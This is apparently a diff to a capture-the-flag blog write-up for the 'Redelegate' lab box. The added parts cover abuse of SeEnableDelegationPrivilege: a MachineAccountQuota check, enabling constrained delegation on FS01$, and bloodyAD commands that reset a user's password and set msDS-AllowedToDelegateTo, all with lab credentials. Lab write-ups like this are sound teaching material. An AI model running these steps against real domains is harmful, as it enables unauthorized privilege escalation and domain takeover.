@@ -6,7 +6,7 @@ ShowToc: true
 TocOpen: true
 tags:
   - blog
-lastmod: 2026-01-24T09:23:32.802Z
+lastmod: 2026-01-24T16:54:50.603Z
 ---
 # Box Info
 
@@ -567,6 +567,17 @@ evil-winrm-py PS C:\Users\Helen.Frost\Documents>
 
 ### SeEnableDelegationPrivilege (To-be finish)
 
+To exploit unconstrained delegation, I would typically add a computer account and a DNS record, set that computer up for unconstrained delegation, and then coerce the DC to authenticate to it. Unfortunately the `MachineAccountQuota` for this domain is 0:
+
+```
+└─#  netexec ldap dc.redelegate.vl -u marie.curie -p 'Fall2024!' -M maq
+LDAP        10.129.234.50   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (signing:None) (channel binding:No TLS cert)
+LDAP        10.129.234.50   389    DC               [+] redelegate.vl\marie.curie:Fall2024! 
+MAQ         10.129.234.50   389    DC               [*] Getting the MachineAccountQuota
+MAQ         10.129.234.50   389    DC               MachineAccountQuota: 0
+                                                                             
+```
+
 ```
 evil-winrm-py PS C:\Users\Helen.Frost\Desktop> whoami /priv
 
@@ -582,6 +593,8 @@ SeIncreaseWorkingSetPrivilege Increase a process working set                    
 
 ```
 
+To exploit constrained delegation, I’ll configure it on FS01\$:
+
 ```
 evil-winrm-py PS C:\Users\Helen.Frost\Desktop> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
 /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
@@ -589,12 +602,11 @@ evil-winrm-py PS C:\Users\Helen.Frost\Desktop> Set-ADAccountControl -Identity "F
 ```
 
 ```
-evil-winrm-py PS C:\Users\Helen.Frost\Desktop> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.rede
-legate.vl"}
+bloodyAD --host 10.10.97.217 -d redelegate.vl -u Marie.Curie -p 'Fall2024!' set password Helen.Frost 'Fall2024!'
 ```
 
 ```
-netexec smb dc.redelegate.vl -u helen.frost -p Password123 -M change-password -o USER='FS01$' NEWPASS=Password123
+bloodyAD --host 10.129.234.50  -d redelegate.vl -u Helen.Frost -p 'Fall2024!' set object 'FS01$' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
 ```
 
 ### getST.py
